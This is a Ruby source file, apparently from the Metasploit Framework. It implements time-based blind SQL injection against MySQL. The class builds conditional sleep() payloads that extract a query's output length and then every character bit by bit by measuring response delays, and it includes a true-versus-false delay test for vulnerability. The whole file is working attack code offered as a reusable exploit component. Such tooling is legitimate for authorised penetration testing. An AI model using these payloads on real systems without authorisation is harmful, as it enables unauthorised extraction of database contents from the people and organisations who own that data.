#
#   Time-Based Blind SQL injection support for MySQL
#
class Msf::Exploit::SQLi::MySQLi::TimeBasedBlind < Msf::Exploit::SQLi::MySQLi
  def initialize(opts, &query_proc)
    @sleepdelay = opts[:sleepdelay] || 1
    @sleepfunc = opts[:sleepfunc] || :sleep
    super
  end

  def run_sql(query)
      # TODO: determine sleepdelay manually, and detect latency
    # TODO: be more verbose if verbose is true
    # first, get the length of the output
    reversed_output_length = 0
    i = 0
    loop do
      output_bit = blind_request("if(1=substr(bin(length((#{query}))), #{i + 1}, 1),#{@sleepfunc}(#{@sleepdelay}),0)")
      reversed_output_length |= (1 << i) if output_bit
      i += 1
      stop = blind_request("if(''=substr(bin(length((#{query}))), #{i + 1}, 1),#{@sleepfunc}(#{@sleepdelay}),0)")
      break if stop # substr returned an empty string, end of input
    end
    # reverse the bits in reversed_output_length
    output_length = 0
    i.times do
      output_length <<= 1
      output_length |= reversed_output_length & 1
      reversed_output_length >>= 1
    end
    puts "[?] output of length #{output_length}"
    # now, get the output, of the given length

    output = output_length.times.map do |j|
      current_character = 0
      8.times do |k|
        # the query below: the inner substr returns a character from the result, the outer returns a bit of it
        output_bit = blind_request("if(1=substr(lpad(bin(ascii(substr((#{query}), #{j + 1}, 1))), 8,'0'),#{k + 1},1),#{@sleepfunc}(#{@sleepdelay}),0)")
        current_character |= (1 << (7 - k)) if output_bit
      end
      current_character.chr
    end.join
    output
  end

  def test_vulnerable
    # run_sql, or just check for delays?
    out_true = blind_request("if(1=1,#{@sleepfunc}(#{@sleepdelay}),0)")
    out_false = blind_request("if(1=2,#{@sleepfunc}(#{@sleepdelay}),0)")
    p out_true
    p out_false
    out_true && !out_false
  end

  private

  def check_opts(opts)
    if opts[:sleepdelay] && opts[:delaytestsample] || (!opts[:sleepdelay] && !opts[:delaytestsample])
      raise ArgumentError, 'Please supply either sleepdelay or delaytestsample'
    end
    super
  end
  
  def blind_request(query)
    time = Time.now
    @query_proc.call(@prefix + query + @suffix)
    Time.now - time >= @sleepdelay
  end
end
